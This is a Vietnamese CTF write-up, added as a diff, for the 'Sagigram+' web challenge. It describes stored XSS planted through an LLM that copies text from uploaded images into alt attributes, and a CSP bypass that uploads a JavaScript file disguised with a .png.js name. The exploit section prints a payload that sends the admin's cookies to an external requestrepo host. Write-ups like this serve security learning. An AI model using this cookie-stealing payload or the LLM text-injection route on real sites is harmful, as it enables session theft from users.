@@ -1,0 +1,67 @@
+---
+title: Sagigram+
+description: ''
+tags:
+  - writeup
+  - xss
+  - csp
+  - file-upload
+category: web
+draft: false
+date: 2023-07-04
+ctf_event: TFCCTF2024
+---
+
+import Callout from '@/components/mdx/Callout.astro';
+
+Status: Done
+
+## Summary
+
+<Callout type="note" title="Note">
+💡 Một challenge khá là hay về WEB LLM 
+Tuy nhiên vì bài blackbox, không rõ ràng nên việc phát hiện llm khá là khó
+Challenge này mình không làm được khi trong giải, do việc mình upload lên file ảnh lớn và llm model không extract ra được nên mình nghĩ vuln nằm ở chỗ khác
+Thêm 1 cái nữa chall này khá khó ở chỗ send friend req, ta không thấy được nó làm gì. Tuy nhiên ở đây admin sẽ nhận đc friend req và visit profile của ta.
+
+</Callout>
+
+## Description
+
+![Untitled](/uploads/sagigram/sagigram/untitled.png)
+
+## Analyst
+
+- Ý tưởng của bài này là ta cần có XSS store trong server. Từ đó admin visit và gửi flag lưu trong cookie
+- Đầu tiên khi ta up lên 1 file ảnh text thì thì thấy llm extract ra text và đẩy vào alt. Nếu mà ảnh không có text thì nó để mặc định là default description
+
+  ![Untitled](/uploads/sagigram/sagigram/untitled-1.png)
+
+- Từ đó ta nghĩ đến ý tưởng close vvalue alt và chèn xss vào. Thành công, tuy nhiên ở đây csp gán self do đó code payload không được thực hiện
+- Ở đây ta nghĩ đến ý tưởng nếu ta có thể đẩy lên 1 file js lưu ở server thì khi script gọi đến src path đấy thì sẽ nhận src script là self và execute.
+- Từ đó ý tưởng của ta:
+  - Đẩy lên file js để bypass filter png khi upload ta chỉ cần chèn filename.png.js
+  - Sau đó đẩy lên một ảnh text để llm extract ra chèn code xss vào là thành công gửi req ra webhook
+  - Sau đó gửi friend req đến admin để lấy flag
+
+## Exploit
+
+- Đẩy lền file js
+
+![Untitled](/uploads/sagigram/sagigram/untitled-2.png)
+
+- Payload file js có dạng như sau:
+
+```python
+document.location="http://om6gplwj.requestrepo.com?"+document.cookie;
+
+vì bài này còn set thêm default-src nên ta dùng document.location thay vì fetch
+```
+
+- up lên 1 cái ảnh như sau:
+  ![1.png](/uploads/sagigram/sagigram/1.png)
+- Gửi req cho admin và có flag
+
+![Untitled](/uploads/sagigram/sagigram/untitled-3.png)
+
+## Result
